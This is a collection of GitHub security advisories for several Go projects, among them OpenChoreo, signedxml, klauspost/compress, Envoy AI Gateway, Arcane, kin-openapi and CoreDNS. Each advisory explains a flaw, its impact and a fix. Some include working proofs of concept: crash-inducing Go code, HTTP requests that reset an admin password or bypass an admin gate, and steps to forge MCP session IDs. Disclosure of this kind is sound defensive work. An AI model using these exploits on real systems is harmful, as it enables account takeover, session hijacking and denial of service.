entry.title: [github.com/openchoreo/openchoreo] OpenChoreo: Authorization bypass on WorkflowRun update allows cross-project takeover of workflow runs
entry.content:
Summary

The OpenChoreo API server authorized PUT .../workflowruns/{runName} against ownership metadata taken from the request body, while the object it actually mutated was selected by the URL path. Nothing forced the two to agree.

A WorkflowRun's membership in a project and component is carried entirely by its openchoreo.dev/project and openchoreo.dev/component labels. Because the workflowrun:update check read those labels from the submitted object rather than the stored one, a caller holding workflowrun:update on one component could name a run belonging to a different project or component in the URL, supply labels for the component they legitimately control, pass the check, and have the unrelated run rewritten with their own ownership labels.

The namespace is taken from the URL and feeds both the authorization check and the Kubernetes read, so it cannot diverge. This is cross-project and cross-component escalation inside a single namespace, not a cross-tenant issue.

Impact

Rewriting the ownership labels transfers authority over the run. Every other WorkflowRun check (view, logs, events, status, delete, list) derives its scope from the stored labels, so once the write lands the policy engine legitimately grants the attacker access to an object they never had rights to. They can then:

  • Read the victim's build logs. These stream raw pod logs from the workflow plane and routinely carry source paths, registry destinations, and credentials a build step echoed by accident.
  • Read the run's Kubernetes events.
  • Delete the run.

So the primary impact is confidentiality and availability, not only integrity. On the integrity side, spec.workflow.parameters can be overwritten on a pending run, and manipulating the two ownership labels can either wedge the run in a permanent ComponentValidationFailed condition or downgrade it to a standalone run that skips component validation.

Exploitation requires an authenticated caller with an AuthzRoleBinding or ClusterAuthzRoleBinding granting workflowrun:update at project or component scope in the victim's namespace, plus knowledge of the target run's name. An anonymous caller cannot reach this.

Patches

The authorization check now loads the stored WorkflowRun and derives every ownership attribute from it instead of from the request body. Separately, the openchoreo.dev/project and openchoreo.dev/component labels are now immutable on update, so an authorized caller cannot hand their own run to another project either.

Line Affected Fixed in
1.0.x 1.0.0 through 1.0.5 1.0.6
1.1.x 1.1.0 through 1.1.6 1.1.7
1.2.x 1.2.0 through 1.2.4 1.2.5

Upgrade to the patched release on your line. No configuration change is needed after upgrading.

Workarounds

If you cannot upgrade immediately, restrict who holds workflowrun:update.

Audit your AuthzRole and ClusterAuthzRole definitions for that action and remove it from any role granted to principals you would not trust with write access to every workflow run in the namespace. Among the roles shipped with OpenChoreo, only the system role workload-publisher lists workflowrun:update explicitly, and admin holds it through its * wildcard. Custom roles in your own values file may also include it, so check those.

Treat any credential bound to workload-publisher as privileged. CI systems are the usual holder, and a leaked CI token is enough to run this.

entry.title: [github.com/moov-io/signedxml] Moov signedxml: Unauthenticated denial of service in exclusive XML canonicalization
entry.content:
Exclusive XML canonicalization (http://www.w3.org/2001/10/xml-exc-c14n#) in github.com/moov-io/signedxml copied the entire accumulated namespace map at every node during ValidateReferences(), before any reference digest or signature check.

For a chain of nested elements that each declare many unused namespace prefixes, that produced O(m × depth²) time and peak memory (m = prefixes per level). beevik/etree caps tree depth (~1024), but m is unbounded, so a small attacker-controlled document (on the order of 1 MB) could drive multi-gigabyte allocations and OOM the process. No valid signature, matching certificate, or authentication is required.

This is the library’s core path for SAML / WS-Federation service providers, which canonicalize attacker-supplied XML prior to authentication.

Affected

  • Package: github.com/moov-io/signedxml
  • Function: ExclusiveCanonicalization (exclusivecanonicalization.go)
  • Verified: v1.4.0 and current default branch (commit d79064a). Earlier v1.2.x–v1.3.x releases are likely affected.

Remediation

Do not copy the whole namespace map per node. Maintain a single scope and push/pop only the prefixes introduced at each element. Replace linear prefix-in-scope scans with set lookups. Impose a defensive cap on in-scope namespace declarations and return an error rather than allocating unbounded memory.

From @shuji-oh 

Thanks for the fix — I re-ran my PoC against this branch and confirmed the memory blowup is gone.

Before (main)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=     45MB
depth=500  m=10  payload=  0.14MB allocated=    179MB
depth=1000 m=10  payload=  0.27MB allocated=    711MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=    377MB
depth=1000 m=100 payload=  2.57MB allocated=   6278MB
After (fix/exc-c14n-namespace-dos)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=      2MB
depth=500  m=10  payload=  0.14MB allocated=      4MB
depth=1000 m=10  payload=  0.27MB allocated=      7MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=      4MB
depth=1000 m=100 payload=  2.57MB allocated=     47MB
That's roughly a 100–130x reduction in peak allocation for the same payload sizes, and no OOM in any of my runs. This looks like it resolves the issue — thanks for the quick fix!

Reported by Shuji Ohira (@shuji-oh).

entry.title: [github.com/klauspost/compress] Compress/s2: Integer Overflow or Wraparound and Out-of-bounds Write in compress
entry.content:
Signed Integer Overflow in s2.NewDict

Summary

A signed integer overflow vulnerability in s2.NewDict() allows an attacker to bypass repeat index validation by supplying a dictionary with a uvarint-encoded repeat value exceeding MaxInt64. When Dict.Encode() is subsequently called, the overflowed negative repeat value causes an out-of-bounds memory access via unsafe.Pointer arithmetic, crashing the process with SIGSEGV.

Package

  • Name: github.com/klauspost/compress/s2
  • Ecosystem: Go
  • Affected versions: <= v1.18.6 (all versions with NewDict function)

Severity

High (7.5) — CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Vulnerability

Type

  • CWE-190: Integer Overflow or Wraparound
  • CWE-787: Out-of-bounds Write (via unsafe.Pointer)

Description

The NewDict() function reads a uvarint from dictionary data and converts it to int:

r, n := binary.Uvarint(dict)
// ...
d.repeat = int(r)
if d.repeat > len(dict) {
    return nil
}

When r exceeds MaxInt64 (9223372036854775807), int(r) overflows to a negative value. Since a negative number is never greater than a positive length, the validation check is bypassed.

When Dict.Encode() is called, the negative repeat value causes an integer overflow in encodeBlockDictGo():

repeat := len(dict.dict) - dict.repeat  // overflows: 62 - (-5758978476775341977) = huge positive
candidate := len(dict.dict) - repeat + s // underflows to negative
load32(dict.dict, candidate)             // OOB via unsafe.Pointer

load32 calls le.Load32 which uses unsafe.Pointer arithmetic without bounds checking:

func Load32[I Indexer](b []byte, i I) uint32 {
    return *(*uint32)(unsafe.Add(unsafe.Pointer(unsafe.SliceData(b)), i))
}

This causes a segmentation fault (SIGSEGV) when the negative index is dereferenced.

PoC

package main

import (
    "encoding/binary"
    "fmt"
    "github.com/klauspost/compress/s2"
)

func main() {
    var dictData []byte
    buf := make([]byte, binary.MaxVarintLen64)
    n := binary.PutUvarint(buf, 12687765596934209639) // > MaxInt64
    dictData = append(dictData, buf[:n]...)
    dictData = append(dictData, make([]byte, 16)...) // minimum dict size

    dict := s2.NewDict(dictData)
    // dict is non-nil despite invalid repeat value (overflow bypassed validation)

    src := make([]byte, 64)
    for i := range src { src[i] = byte(i) }
    dict.Encode(nil, src) // SIGSEGV: OOB access via unsafe.Pointer
}

Impact

  • Denial of Service: The process crashes immediately with SIGSEGV

Attack Vector

Any application that:

  1. Accepts user-supplied S2 dictionary data via s2.NewDict()
  2. Calls Dict.Encode() on any data ≥32 bytes

Suggested Fix

Validate the uvarint value before converting to int:

if r > math.MaxInt64 {
    return nil
}
d.repeat = int(r)

Or use uint for the repeat field and validate against uint(len(dict)).

References

  • Source: s2/dict.go lines 59-61 (vulnerability), s2/encode_all.go line 947 (crash site)
  • Commit: 539243b (v1.18.6 + 4 commits)

Credits

Christopher Linke / https://github.com/celinke97/

  • https://nvd.nist.gov/vuln/detail/CVE-2026-63209

entry.title: [github.com/envoyproxy/ai-gateway] agent-router: MCP session resume does not verify the embedded anti-hijacking subject; default Helm seed makes session IDs forgeable
entry.content:
Summary

The MCP proxy's client-facing session ID embeds the authenticated caller's subject (JWT sub claim) specifically as an anti-hijacking discriminator — matching the Model Context Protocol specification's documented session-hijacking guidance (https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices#session-hijacking). However, the session-resume path never checks that discriminator against the current caller's identity, so any client that obtains a session ID (its own or another user's) can resume that session and act with it — including on routes with per-user backend sessions. This is aggravated by the official Helm chart shipping a literal, publicly known default seed ("default-insecure-seed") for the key that encrypts these session IDs.

Impact

An attacker who obtains (or, under the default seed, forges) another user's Mcp-Session-Id value can resume that user's MCP session against the backend MCP server(s) bound to the route — reading conversation/tool-call state and invoking further JSON-RPC methods (e.g. tools/call, resources/read) in the context of that other user's already-initialized backend session. On a multi-tenant AI Gateway deployment, this crosses the exact trust boundary the subject-embedding was added to protect.

Location

  • internal/mcpproxy/session.go — clientToGatewaySessionID.backendSessionIDs() (around line 707-765): parses {routeName}@{subject}@{backends} and returns only (perBackendSessionIDs, route, error). The comment at the subject-parsing site reads: "The subject ... is retained inside the encrypted session ID for anti-hijacking purposes but is not needed during parsing." — the subject is discarded, never returned, never compared.
  • internal/mcpproxy/mcpproxy.go — sessionFromID(id, lastEvent) (around line 282-323): resumes a session purely from the decrypted blob; it is never passed the current request's authenticated subject, so there is nothing to compare against even if backendSessionIDs() did return it.
  • internal/mcpproxy/legacy.go — extractSubject(r) (around line 1549-1562) is called exactly once, only at session creation (handleInitializeRequest -> newSession, line ~307/484/491) to embed the subject when the session ID is minted. All three session-resume call sites (serveGET/servePOST/serverDELETE paths, lines ~133, 167, 216) call sessionFromID with no subject argument at all.
  • internal/mcpproxy/mcpproxy.go line 259 (clientToGatewaySessionIDFromEntries) is where the subject is embedded at creation, confirming the intended design.
  • Aggravating factor: manifests/charts/ai-gateway-helm/values.yaml line 297 ships seed: "default-insecure-seed" as the out-of-the-box value for controller.mcp.sessionEncryption.seed, which templates/deployment.yaml passes straight to --mcpSessionEncryptionSeed (also literally defaulted to "default-insecure-seed" in cmd/controller/main.go and cmd/extproc/mainlib/main.go when the flag is omitted entirely). Session IDs are salt || nonce || ciphertext (see internal/mcpproxy/crypto.go), so knowing the seed and the (also-defaulted) PBKDF2 iteration count is sufficient to derive the AES-GCM key and both decrypt observed session IDs and encrypt new ones for an arbitrary chosen subject/backend-session combination.

Reproduction (code-level, not run against a live cluster)

  1. Deploy Envoy AI Gateway with an MCPRoute that has an OAuth/JWT SecurityPolicy attached (so internalapi.MCPSubjectHeader is populated) and at least one backend MCP server, using the Helm chart's default values.yaml (controller.mcp.sessionEncryption.seed left at "default-insecure-seed").
  2. User A authenticates with a valid JWT (sub: user-a) and sends an initialize JSON-RPC request to the route. The gateway creates backend session(s) and returns Mcp-Session-Id: <encrypted-blob-A>, whose plaintext is {route}@user-a@{backend}:{base64(sessionID)}:{capHex}.
  3. Attacker (any other authenticated user, or — since the seed is public and default — even without ever having a legitimate session at all) constructs {route}@user-a@{backend}:{base64(<any-or-known-backend-session-id>)}:fff, derives the AES-GCM key via PBKDF2(sha256, "default-insecure-seed", salt, 100000, 32) for a salt of their choosing, and encrypts it themselves to produce a session ID that decrypts to the same structure sessionFromID expects.
  4. Attacker sends a subsequent JSON-RPC request (e.g. tools/call) to the same route with header Mcp-Session-Id: <forged-or-captured-blob-A>. The gateway decrypts it, extracts perBackendSessionIDs for backend, and forwards the attacker's call using that backend session — with no comparison to the attacker's own JWT subject at any point in sessionFromID / backendSessionIDs().

Suggested fix

  • In sessionFromID, thread the current request's extractSubject(r) value through to backendSessionIDs() (or a wrapping call) and reject resumption (401/403) when the decrypted subject does not match the current caller's subject — restoring the anti-hijacking check the embedding was built for.
  • Independently, change the Helm chart's default controller.mcp.sessionEncryption.seed to be randomly generated per install (e.g. via a Helm lookup/randAlphaNum in a pre-install hook, or a required value with no default), rather than shipping a literal, fixed string. At minimum, fail startup (rather than just logging) when the seed equals the documented insecure default in a non-dev/insecure-allowed mode.

Detected by

Aeon vuln-scanner — agentic dataflow review (internal/mcpproxy entrypoint, Envoy AI Gateway data-plane MCP proxy), followed by manual adversarial verification against the exact HEAD commit of main (472da7db7984f769c9a77671d12c0354e75fc3ba, confirmed to match repos/theagentrouter/agent-router/commits/main at time of report). Dependency-CVE findings from this scan (osv-scanner, go.mod/package-lock.json) are not included here — they are all already covered by open Dependabot PRs (#2555, #2643, #2672, #2497, #2615) and are omitted to avoid duplicate filings.

entry.title: [github.com/getarcaneapp/arcane/backend/v2] Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)
entry.content:
Summary

A user holding the delegated users:update permission can reset the global administrator's password and take over the admin account. UpdateUser sets the target user's PasswordHash from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by RequireGlobalAdmin, users:update is intended to sit BELOW admin (profile management); this finding defeats that separation.

Root Cause

UpdateUser (handler backend/api/handlers/users.go:317-323) loads the target by ID and sets userModel.PasswordHash from the request body for any user, then userService.UpdateUser (user_service.go:174) simply tx.Saves — with NO actor-vs-target privilege comparison. The only IsGlobalAdmin guard (user_service.go:345) is a last-admin check inside DeleteUser, not the update path. Role assignment / role CRUD are RequireGlobalAdmin (backend/pkg/authz/permissions.go:27-33), proving users:update is intended below admin.

Impact

Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated users:update permission.

Proof of Concept

  1. Admin delegates a custom "User Manager" role with users:update.
  2. PUT /users/{adminId} with {"password":"attacker123"}.
  3. POST /auth/login {"username":"arcane","password":"attacker123"} → admin session.

Attack Chain

  1. Action: admin delegates custom role with users:update. Guard: role creation is RequireGlobalAdmin. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).
  2. Action: PUT /users/{adminId} {"password":"attacker123"}. Guard: RequirePermission(users:update) (users.go:154). Bypass: holder has it; no hierarchy check (users.go:317-323, user_service.go:174 unconditional Save).
  3. Action: POST /auth/login as admin → admin session.

Bypass Evidence

  • users.go:317-323 sets PasswordHash for any target; user_service.go:174-194 has no actor/target privilege comparison.
  • Only IsGlobalAdmin hits are DeleteUser's last-admin guard and DTO flags (grep).
  • users:update is org-level, held by no built-in non-admin role (permissions.go:24).

Affected Versions

<= 2.5.0.

Reported by zx (Jace) — GitHub: @manus-use

References

  • https://github.com/getarcaneapp/arcane/security/advisories/GHSA-pw5q-rjx4-7f7p

entry.title: [github.com/getarcaneapp/arcane/backend/v2] Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`
entry.content:
Summary

Arcane v2.10.2 contains an authorization inconsistency in AuthMiddleware.managerAuth.

When a request supplies a valid environment access token through the X-Arcane-Agent-Token header, managerAuth resolves the associated environment, installs an environment-scoped permission set, and immediately calls next(c).

This occurs before the middleware evaluates the AdminRequired option and verifies that the caller is a global administrator.

As a result, an environment-scoped access token can access routes protected with WithAdminRequired(), despite the corresponding EnvironmentPermissionSet intentionally containing no global or sudo permissions.

In v2.10.2, the affected admin-only surface is the manager's Go pprof diagnostic interface under:

/api/debug/pprof/*

This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators.

The issue is an incorrect authorization vulnerability (CWE-863).

Details

1. Environment access tokens are accepted by the manager authentication middleware

The production authentication middleware is configured with an environment access-token resolver:

backend/internal/di/providers.go

Conceptually, the middleware is constructed as:

auth.NewAuthMiddleware(authService, cfg).
    WithApiKeyValidator(apiKey).
    WithEnvironmentAccessTokenResolver(env).
    WithPermissionResolver(role)

Therefore, the X-Arcane-Agent-Token authentication path is active in the production manager.

2. The environment-token path returns before authorization options are evaluated

The relevant logic is in:

backend/internal/auth/middleware.go

managerAuth first checks the X-Arcane-Agent-Token header.

When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing:

if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" {
    if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok {
        environmentScopedInternal(c, env)
        return next(c)
    }
}

The important part is the unconditional:

return next(c)

The normal authentication path later evaluates the middleware's AdminRequired option:

ps := m.resolvePermissionsOrDeny(ctx, user)

if m.options.AdminRequired && !ps.IsGlobalAdmin() {
    return c.JSON(http.StatusForbidden, common.APIError{
        Code:    "FORBIDDEN",
        Message: "You don't have permission to access this resource",
    })
}

The environment-token branch never reaches this check.

Consequently, WithAdminRequired() has no effect when authentication succeeds through a valid environment access token.

This creates an authorization inconsistency between authentication mechanisms:

  • normal user/session authentication → AdminRequired is enforced;

  • environment access-token authentication → AdminRequired is bypassed.

3. Environment tokens are intentionally not global-administrator credentials

backend/pkg/authz/permission_set.go defines the effective permissions assigned to an environment access token.

EnvironmentPermissionSet(envID) grants environment-scoped permissions only for the specified environment:

func EnvironmentPermissionSet(envID string) *PermissionSet {
    ps := NewPermissionSet()

    if envID == "" {
        return ps
    }

    for _, p := range AllPermissions() {
        if IsEnvScoped(p) {
            ps.AddEnv(envID, p)
        }
    }

    return ps
}

The implementation explicitly establishes that these credentials do not receive global or sudo permissions.

Therefore, an environment access token should not satisfy a global-administrator authorization requirement.

The early return in managerAuth bypasses this intended privilege boundary.

4. /api/debug/pprof/* explicitly requires global-administrator authorization

The diagnostic routes are registered in:

backend/api/ws/diagnostics.go

The pprof group is protected using:

pprofGroup := group.Group(
    "/debug/pprof",
    authMiddleware.WithAdminRequired().Add(),
)

The source also documents the intended authorization requirement by noting that pprof keeps the stricter admin-required gate.

The group exposes handlers including:

/api/debug/pprof/
/api/debug/pprof/cmdline
/api/debug/pprof/profile
/api/debug/pprof/symbol
/api/debug/pprof/trace
/api/debug/pprof/heap
/api/debug/pprof/goroutine
/api/debug/pprof/allocs
/api/debug/pprof/block
/api/debug/pprof/mutex
/api/debug/pprof/threadcreate

Named profiles are dispatched through pprof.Handler.

Because WithAdminRequired() is bypassed by the environment-token branch, a valid environment access token can reach these handlers even though its permission set is not globally privileged.

5. Other middleware does not restore the missing authorization check

The CSRF middleware recognizes X-Arcane-Agent-Token as a header-based credential and does not apply the normal cross-origin CSRF validation to such requests.

Additionally, the environment proxy middleware passes through requests that do not target an /environments/{id}/... path.

Therefore a request to:

/api/debug/pprof/*

can proceed to managerAuth, enter the environment-token authentication branch, and reach the pprof handler without another global-administrator authorization check being applied.

Source-to-sink authorization path

The vulnerable control flow is:

X-Arcane-Agent-Token
        |
        v
environment access token resolver
        |
        v
environment resolved successfully
        |
        v
EnvironmentPermissionSet(environmentID)
        |
        v
return next(c)
        |
        |  AdminRequired check is skipped
        v
/api/debug/pprof/*
        |
        v
net/http/pprof handler

The security boundary violation occurs at the early return next(c).

Proof of Concept

Preconditions

The test requires:

  1. A valid Arcane environment access token.

  2. An Arcane manager running the affected code.

  3. No global-administrator account or credentials.

Test 1 — environment access token

Send a request to an admin-protected pprof endpoint using only an environment access token:

GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
X-Arcane-Agent-Token: <VALID_ENVIRONMENT_ACCESS_TOKEN>

No administrator session cookie or administrator Bearer token is supplied.

Vulnerable behavior

On an affected instance, the request is expected to reach the pprof handler instead of being rejected by WithAdminRequired().

A successful response demonstrates that the environment-token authentication branch bypasses the administrator requirement.

For example, the response may contain the Go heap profiling output generated by net/http/pprof.

Test 2 — non-admin user contrast case

Send the same request using a normal authenticated non-global-admin user:

GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
Authorization: Bearer <NON_ADMIN_ACCESS_TOKEN>

The expected result is:

HTTP/1.1 403 Forbidden

with an authorization error indicating that the user does not have permission to access the resource.

This contrast demonstrates the authorization inconsistency:

environment-scoped token
        -> admin gate skipped
        -> pprof handler reached

normal non-admin user
        -> admin gate evaluated
        -> HTTP 403

Expected secure behavior

A valid environment access token should receive:

HTTP/1.1 403 Forbidden

for every route protected with WithAdminRequired().

Only a caller whose effective permission set satisfies IsGlobalAdmin() should be allowed to access these routes.

Impact

An attacker who obtains a valid environment access token can cross the intended authorization boundary between an individual environment and manager-wide administrative functionality.

In the currently identified route configuration, this allows unauthorized access to the manager's Go pprof diagnostic endpoints.

Depending on the requested profile, these endpoints can expose internal runtime and diagnostic information such as:

  • goroutine stack traces;

  • function and package names;

  • allocation and heap profiling information;

  • CPU profiling information;

  • runtime execution traces;

  • process command-line information;

  • mutex, block, thread and allocation profiling data.

This information is normally restricted to global administrators by Arcane's explicit use of WithAdminRequired().

Some profiling operations may also impose additional CPU, memory, or tracing overhead while being collected.

Importantly, this report does not assume that Go's pprof heap endpoint is an arbitrary raw-process-memory dump. Direct extraction of session tokens, environment access tokens, passwords, or other credentials from pprof output has not been demonstrated and is therefore not claimed as part of the confirmed impact.

The confirmed security issue is the authorization bypass itself and the resulting unauthorized exposure of administrator-restricted diagnostic functionality.

Root Cause

The root cause is that authentication through an environment access token takes an early-success path:

environmentScopedInternal(c, env)
return next(c)

before common middleware authorization options are evaluated.

As a result, authorization requirements configured on the middleware are dependent on which authentication mechanism is used.

Authentication establishes the identity and scope of the caller, but route-level authorization requirements such as AdminRequired should subsequently be applied consistently regardless of the authentication mechanism.

Remediation

The environment-token authentication path should not call next(c) before the configured authorization requirements have been evaluated.

One approach is to resolve the environment token into its EnvironmentPermissionSet and then pass that permission set through the same authorization-option evaluation used by other authentication mechanisms.

For example, logically:

if envTokenIsValid {
    ps := authz.EnvironmentPermissionSet(env.ID)

    if m.options.AdminRequired && !ps.IsGlobalAdmin() {
        return forbidden
    }

    environmentScopedInternal(c, env)
    return next(c)
}

Because an EnvironmentPermissionSet intentionally has no global permissions, an environment token would then correctly receive HTTP 403 for WithAdminRequired() routes.

As additional defense in depth, the pprof endpoints could explicitly reject environment access tokens and other environment-scoped authentication mechanisms, allowing access only through authentication mechanisms capable of representing a global administrator.

It may also be worth considering whether pprof should be exposed in production by default or enabled only through an explicit diagnostic configuration option.

Regression Tests

The following cases should be covered:

Valid environment access token
+ /api/debug/pprof/heap
=> 403

Normal authenticated non-admin user
+ /api/debug/pprof/hea
=> 403

Unauthenticated request
+ /api/debug/pprof/heap
=> 401/403

Global administrator
+ /api/debug/pprof/heap
=> 200

More generally, tests should verify that every authentication mechanism is subject to middleware options such as AdminRequired.

The issue could also broadly be categorized as an authorization-check bypass caused by inconsistent authorization handling across authentication paths..

No claim of credential extraction, arbitrary process-memory disclosure, or global-administrator takeover is made unless separately demonstrated through dynamic testing.

References

  • https://github.com/getarcaneapp/arcane/security/advisories/GHSA-mp22-58ff-6fhr
  • https://github.com/getarcaneapp/arcane/pull/3881
  • https://github.com/getarcaneapp/arcane/commit/4fe4c7ed9483dff7d43e3c4bee6a92037ce886b4
  • https://github.com/getarcaneapp/arcane/releases/tag/backend/v2.11.0
  • https://github.com/advisories/GHSA-mp22-58ff-6fhr

entry.title: [github.com/getkin/kin-openapi] kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content
entry.content:
Summary

ValidateResponse panics on a nil pointer when a spec declares a response header with content instead of schema. doc.Validate() accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects github.com/getkin/kin-openapi <= v0.145.0. Reproduced on master 947498e5a6bd, Go 1.26.

Details

A content-typed response header has headerRef.Value.Schema == nil.

validate_response.go:181 passes it straight through:

if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {

and req_resp_decoder.go:273 is where it lands:

if len(schema.Value.AllOf) > 0 {

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, :114 returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

PoC

Drop into openapi3filter/ and run:

go test ./openapi3filter/ -run NilSchema -v

package openapi3filter_test

import (
    "context"
    "io"
    "net/http"
    "net/http/httptest"
    "strings"
    "testing"

    "github.com/getkin/kin-openapi/openapi3"
    "github.com/getkin/kin-openapi/openapi3filter"
    "github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
    t.Helper()
    doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
    if err != nil {
        t.Fatalf("load: %v", err)
    }
    if err := doc.Validate(context.Background()); err != nil {
        t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
    }
    op := doc.Paths.Find("/x").Get
    req := httptest.NewRequest(http.MethodGet, "/x", nil)
    return &openapi3filter.ResponseValidationInput{
        RequestValidationInput: &openapi3filter.RequestValidationInput{
            Request: req,
            Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
        },
        Status: 200,
        Header: hdr,
        Body:   io.NopCloser(strings.NewReader(`{}`)),
    }
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
    in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
    defer func() {
        if r := recover(); r != nil {
            t.Errorf("body path panicked, expected clean return: %v", r)
        }
    }()
    if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
        t.Errorf("body path returned %v, expected nil", err)
    }
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
    in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
    if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
        t.Fatalf("no panic; got err = %v (already fixed?)", err)
    }
}

Output:

=== RUN   TestControl_ResponseBodyNilSchema
--- PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
--- FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
    /src/openapi3filter/req_resp_decoder.go:273 +0x4a
github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
    /src/openapi3filter/validate_response.go:181 +0x146
github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
    /src/openapi3filter/validate_response.go:89 +0xafa

The FAIL is the point: control passes, the header case takes the binary down.

Ran in a container against a fresh clone of master. I have not tried it against a live proxy.

Impact

A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.

If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.

If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.

On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.

The header names in it (X-AspNet-Version, p3p, a few malformed ones) look like a generator emitting content where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.

Workarounds

Use schema on the response header, or skip ValidateResponse for those operations. ExcludeResponseBody will not do it -- headers are validated before that check.

Suggested fix

Nil-guard at the top of decodeValue:

if schema == nil {
    return nil, false, nil
}

Returning nil leaves a content-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.

References

  • https://github.com/getkin/kin-openapi/security/advisories/GHSA-74vm-87hj-r66f
  • https://nvd.nist.gov/vuln/detail/CVE-2026-100349
  • https://github.com/getkin/kin-openapi/commit/f5441d67f855ed34d975b3b85665764644ab1459
  • https://github.com/getkin/kin-openapi/releases/tag/v0.146.0
  • https://github.com/advisories/GHSA-74vm-87hj-r66f

entry.title: [github.com/coredns/coredns] CoreDNS `k8s_external` headless AXFR can emit an empty transfer batch that panics the `transfer` plugin
entry.content:
Summary

A network DNS client allowed to request AXFR for a CoreDNS zone can trigger a panic when CoreDNS is configured with k8s_external headless-service zone transfers and Kubernetes contains a headless service endpoint with no declared ports. The built-in k8s_external transferer can emit an empty []dns.RR batch, and the shared transfer plugin indexes records[0] without checking that the batch is non-empty. In normal CoreDNS mode the panic is recovered and returned as SERVFAIL, but repeated triggering can disrupt requests and amplify panic logging; if the debug plugin disables recovery, the same path can crash the CoreDNS process.

Details

plugin/transfer/transfer.go assumes that every Transferer emits only non-empty []dns.RR batches. During AXFR/IXFR response generation it indexes records[0] without checking the slice length:

  • plugin/transfer/transfer.go:129-131
for records := range pchan {
    if x, ok := records[0].(*dns.SOA); ok && soa == nil {
        soa = x
    }

The built-in k8s_external transferer violates that contract for headless services whose endpoints have no declared ports. plugin/k8s_external/transfer.go sends the SRV result slice unconditionally:

  • plugin/k8s_external/transfer.go:104-106
recs, _ := e.srv(ctx, svcs, s)
ch <- recs

plugin/k8s_external/msg_to_dns.go intentionally skips services whose port is -1:

  • plugin/k8s_external/msg_to_dns.go:107-112
for _, s := range services {
    // Don't add the entry if the port is -1 (invalid). The kubernetes plugin uses port -1 when a service/endpoint
    // does not have any declared ports.
    if s.Port == -1 {
        continue
    }

The Kubernetes EndpointSlice conversion creates that sentinel when an EndpointSlice has no ports:

  • plugin/kubernetes/object/endpoint.go:62-66
if len(ends.Ports) == 0 {
    // Add sentinel if there are no ports.
    e.Subsets[0].Ports = []EndpointPort{{Port: -1}}

This creates a built-in source-to-sink chain:

  1. Kubernetes EndpointSlice has ready addresses and no ports.
  2. CoreDNS kubernetes converts it to an endpoint with Port: -1.
  3. k8s_external with headless includes that service in transfer data.
  4. k8s_external.Transfer sends an empty SRV []dns.RR batch.
  5. transfer.ServeDNS indexes records[0] and panics.

Suggested remediation:

  1. In plugin/transfer/transfer.go, skip or reject empty records batches before indexing records[0].
  2. In plugin/k8s_external/transfer.go, only send recs when len(recs) > 0 in the headless endpoint and port/protocol paths.
